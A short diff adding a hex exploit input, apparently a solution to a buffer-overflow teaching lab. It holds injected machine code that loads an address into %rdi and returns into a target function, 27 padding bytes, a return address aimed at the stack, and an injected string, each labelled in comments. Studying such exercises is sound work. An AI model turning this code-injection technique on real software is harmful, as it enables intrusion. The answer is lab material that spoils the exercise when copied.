@@ -1,0 +1,13 @@
+48 c7 c7 a8 dc 61 55  /* mov $0x5561dca8, %rdi */
+68 fa 18 40 00        /* pushq  $0x4018fa */
+c3                    /* retq */
+/* byte code = 13 bytes */
+
+01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27
+/* 27 dummy bytes */
+
+78 dc 61 55 00 00 00 00
+/* return address */
+
+35 39 62 39 39 37 66 61 00
+/* injected string */
